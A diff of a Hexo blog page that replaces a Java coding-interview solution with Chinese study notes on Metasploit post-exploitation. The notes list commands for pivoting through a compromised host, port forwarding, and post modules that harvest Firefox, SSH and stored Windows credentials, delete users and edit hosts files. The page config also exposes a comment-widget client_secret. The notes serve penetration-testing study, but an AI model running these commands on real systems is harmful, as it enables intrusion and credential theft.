@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>【编程题】网易2019笔试：牛牛找工作 | Pyrrhax</title>
+    <title>后渗透阶段-跳板、POST模块 | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -203,7 +203,7 @@
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
     <div class="post-block">
-      <link itemprop="mainEntityOfPage" href="http://yoursite.com/posts/undefined.html">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/posts/9d0c4591.html">
       <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
        <meta itemprop="name" content="Pyrrhax">
        <meta itemprop="description" content="">
@@ -214,11 +214,11 @@
       </span>
     </div>
     <header class="post-header">
-      <h1 class="post-title" itemprop="name headline">【编程题】网易2019笔试：牛牛找工作</h1>
+      <h1 class="post-title" itemprop="name headline">后渗透阶段-跳板、POST模块</h1>
       <div class="post-meta">
         
         <span class="post-date">
-          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2018-09-09T00:00:00+08:00">2018-09-09 00:00:00</time></span>
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-12-12T12:20:10+08:00">2020-12-12 12:20:10</time></span>
         </span>
         
         
@@ -227,7 +227,7 @@
         
         <span class="post-categories">
           
-          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BC%96%E7%A8%8B%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">编程题</span></a></span><i class="fas fa-angle-right"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BC%96%E7%A8%8B%E9%A2%98/%E7%AC%94%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">笔试</span></a></span>
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a></span><i class="fas fa-angle-right"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
         </span>
         
         
@@ -236,35 +236,82 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <p>做了很多次笔试，编程题总是不能在规定时间内完成。一个原因是算法图的部分没有看。还有一个原因是题做得太少。今天开始打算有空的时候整理一下做过的编程题。总结一下知识点，也对自己的做题历程做一个记录。。。</p>
+      <h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><h5 id="autoroute"><a href="#autoroute" class="headerlink" title="autoroute"></a>autoroute</h5><ul>
+<li>利用已经控制的一台计算机作为入侵内网的跳板</li>
+<li>在其它内网计算机看来访问全部来自跳板机</li>
+<li>run autoroute -s 2.2.2.0/24 #不能访问外网的目标网段</li>
+<li>run autoroute -p</li>
+<li>use auxiliary/scanner/portscan/tcp</li>
+</ul>
 <a id="more"></a>
 
-<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>为了找到自己满意的工作，牛牛收集了每种工作的难度和报酬。牛牛选工作的标准是在难度不超过自身能力值的情况下，牛牛选择报酬最高的工作。在牛牛选定了自己的工作后，牛牛的小伙伴们来找牛牛帮忙选工作，牛牛依然使用自己的标准来帮助小伙伴们。牛牛的小伙伴太多了，于是他只好把这个任务交给了你。<br>输入描述:<br>每个输入包含一个测试用例。<br>每个测试用例的第一行包含两个正整数，分别表示工作的数量N(N&lt;=100000)和小伙伴的数量M(M&lt;=100000)。<br>接下来的N行每行包含两个正整数，分别表示该项工作的难度Di(Di&lt;=1000000000)和报酬Pi(Pi&lt;=1000000000)。<br>接下来的一行包含M个正整数，分别表示M个小伙伴的能力值Ai(Ai&lt;=1000000000)。<br>保证不存在两项工作的报酬相同。</p>
-<p>输出描述:<br>对于每个小伙伴，在单独的一行输出一个正整数表示他能得到的最高报酬。一个工作可以被多个人选择。<br>示例1<br>输入<br>3 3<br>1 100<br>10 1000<br>1000000000 1001<br>9 10 1000000000<br>输出<br>100<br>1000<br>1001</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li>首先将工作难度和对应薪资储存在二维数组，按能力要求增序排序。</li>
-<li>排序后需要更新每个难度下的薪资为 可获得的最大值(因为可能存在能力要求高的工作薪资反而低的情况)。</li>
-<li>用二分查找确定能胜任的最大工作难度及其最大报酬。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plain">import java.util.Arrays;<br>import java.util.Scanner;<br>public class Main &#123;<br>    public static void main(String[] args)&#123;<br>        Scanner scanner &#x3D; new Scanner(System.in);<br>        int N&#x3D;scanner.nextInt();<br>        int M&#x3D;scanner.nextInt();<br>        int[][] jobmap&#x3D; new int[N][2];<br>        for(int i&#x3D;0;i&lt;N;i++)&#123;<br>            jobmap[i][0]&#x3D;scanner.nextInt();<br>            jobmap[i][1]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F;将 薪资-能力 二维数组按能力要求增序排序<br>        Arrays.sort(jobmap,(int[] o1, int[] o2) -&gt;  o1[0]-o2[0]);<br>        &#x2F;&#x2F;排序后需要更新每个ability下的薪资为 可获得的最大值(如果低能力要职位的求薪资高于高能力要求职位的薪资，则更新高能力要求职位的薪资为高薪资)<br>        for (int i &#x3D; 0; i &lt; jobmap.length - 1; i++) &#123;<br>            if (jobmap[i][1] &gt; jobmap[i + 1][1]) &#123;<br>                jobmap[i + 1][1] &#x3D; jobmap[i][1];<br>            &#125;<br>        &#125;<br>        int[] people &#x3D; new int[M];<br>        for(int i&#x3D;0;i&lt;M;i++)&#123;<br>            people[i]&#x3D;scanner.nextInt();<br>        &#125;<br>        &#x2F;&#x2F; 二分查找确定能胜任的最大工作难度及其最大报酬<br>        for (int i &#x3D; 0; i &lt; people.length; i++) &#123;<br>            int index &#x3D; Arrays.binarySearch(jobmap, new int[] &#123;people[i], 0&#125;, (int[] jd1, int[] jd2) -&gt;jd1[0] - jd2[0]);<br>            index &#x3D; index &lt; 0 ? -(index + 1) - 1: index;<br>            System.out.println(index &gt;&#x3D; 0 ? jobmap[index][1] : 0);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li>在初次编写代码的时候没有考虑到不一定报酬和工作难度都成正比。考虑不周全，需要注意。</li>
-<li>在初次编写代码的时候，每个人都对所有工作进行遍历查找一次，时间复杂度为O(n²)。在数据量较大时性能不高，导致超时。改为二分查找后时间复杂度为O(log2(n))。</li>
-<li>在使用Arrays.sort(T[] a, Comparator&lt;? super T&gt; c)方法时,使用了lambda表达式替代了匿名内部类。注意返回参数一减参数二的值是增序。</li>
-<li>在使用Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)时也使用了lambda表达式，在使用该方法前需要先使用sort方法排序。当查询的Key存在时，这个方法返回key在该数组中的下标，否则返回(-(insertion point) - 1)，insertion point指的是key在这个数组中应该插入的位置。也就是第一个比key大的值的下标，当key比所有值都大的时候，返回数组长度。所以当且仅当查找到key时，该方法的返回值才是正数。所以我们要寻找的最大报酬的工作的下标为 -(index + 1) - 1。</li>
+<hr>
+<h5 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h5><ul>
+<li>利用已经被控计算机，在kali与攻击目标之间实现端口转发</li>
+<li>portfwd add -L LIP -l LPORT  -r RIP -p RPORT</li>
+<li>portfwd list /delete/flush</li>
 </ul>
-<blockquote>
-<p>Java API中对Arrays.binarySearch(T[] a, T key, Comparator&lt;? super T&gt; c)返回值的描述</p>
-</blockquote>
-<p>index of the search key, if it is contained in the array; otherwise, (-(insertion point) - 1). The insertion point is defined as the point at which the key would be inserted into the array: the index of the first element greater than the key, or a.length if all elements in the array are less than the specified key. Note that this guarantees that the return value will be &gt;= 0 if and only if the key is found.</p>
+<hr>
+<h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><ul>
+<li>use exploit/multi/handler</li>
+<li>set exitonsession false当建立一个session后不会退出</li>
+<li>run -j -z</li>
+</ul>
+<hr>
+<ul>
+<li><p>meterpreter &gt; </p>
+</li>
+<li><p>run post/windows/gather/arp_scanner RHOSTS=192.168.43.0/24</p>
+</li>
+<li><p>run post/windows/gather/checkvm</p>
+</li>
+<li><p>run post/windows/gather/credentials/credential_collector</p>
+</li>
+<li><p>run post/windows/gather/enum_applications</p>
+</li>
+<li><p>run post/windows/gather/enum_logged_on_users</p>
+</li>
+<li><p>run post/windows/gather/enum_snmp</p>
+</li>
+<li><p>run post/multi/recon/local_exploit_suggester检查可用的本地提权漏洞模块</p>
+</li>
+<li><p>run post/windows/manage/delete_user USERNAME=flower</p>
+</li>
+<li><p>run post/multi/gather/firefox_creds 收集firefox缓存的账户密码</p>
+</li>
+<li><p>run post/multi/gather/ssh_creds 收集ssh身份认证信息</p>
+</li>
+<li><p>run post/multi/gather/check_malware REMOTEFILE=c:\\windows\\system32\\cmd.exe</p>
+</li>
+<li><p>run hostsedit -e 1.1.1.1 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 编辑hosts文件</p>
+</li>
+</ul>
+<hr>
+<ul>
+<li><p>自动执行meterpreter脚本</p>
+<ul>
+<li><p>set AutoRunScript migrate -N explorer.exe</p>
+</li>
+<li><p>set InitialAutoRunScript checkvm</p>
+</li>
+</ul>
+</li>
+<li><p>自动执行post模块</p>
+<ul>
+<li>set InitialAutoRunScript migrate -n explorer.exe</li>
+<li>set AutoRunScript post/windows/gather/dumplinks收集最近打开的文档（首先要先切换到目标用户，migrate目标用户所在进程）</li>
+<li>InitialAutoRunScript 先于 AutoRunScript执行</li>
+</ul>
+</li>
+</ul>
+<hr>
 
     </main>
     <footer class="post-footer">
       
       <div class="post-tags">
         
-        <a class="post-tag button" href="/tags/%E7%BC%96%E7%A8%8B%E9%A2%98/" rel="tag"><i class="fas fa-tags"></i>编程题</a>
+        <a class="post-tag button" href="/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fas fa-tags"></i>KaliLinux渗透测试学习笔记</a>
         
       </div>
       
@@ -275,12 +322,12 @@
   <nav class="page-nav">
     <div class="page-nav-next page-nav-item">
       
-      <a href="/posts/61121.html" rel="next" title="我翻译的文章在这里"><i class="fas fa-angle-left"></i><span class="nav-title">我翻译的文章在这里</span></a>
+      <a href="/posts/5e01172b.html" rel="next" title="后渗透阶段-嗅探、痕迹消除"><i class="fas fa-angle-left"></i><span class="nav-title">后渗透阶段-嗅探、痕迹消除</span></a>
       
     </div>
     <div class="page-nav-prev page-nav-item">
       
-      <a href="/posts/undefined.html" rel="prev" title="【编程题】网易2019笔试：瞌睡"><span class="nav-title">【编程题】网易2019笔试：瞌睡</span><i class="fas fa-angle-right"></i></a>
+      <a href="/posts/73d90234.html" rel="prev" title="后渗透阶段-持久后门"><span class="nav-title">后渗透阶段-持久后门</span><i class="fas fa-angle-right"></i></a>
       
     </div>
   </nav>
@@ -307,7 +354,7 @@
       "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
       "no_comment": "这个页面还没有评论，现在就去评论吧！",
       "go_to_comment": "去评论",
-      "issue_title": "【编程题】网易2019笔试：牛牛找工作",
+      "issue_title": "后渗透阶段-跳板、POST模块",
       "btn_class": "button",
       "comments_target": "#comment-thread"
     });
@@ -402,7 +449,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#题目"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#解题思路"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#代码"><span class="toc-text">代码</span></a></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#跳板"><span class="toc-text">跳板</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#autoroute"><span class="toc-text">autoroute</span></a></li><li class="toc-item toc-level-5"><a class="list-group-item toc-link" href="#portfwd"><span class="toc-text">portfwd</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#POST"><span class="toc-text">POST</span></a></li></ol></div>
     </div>
     
     
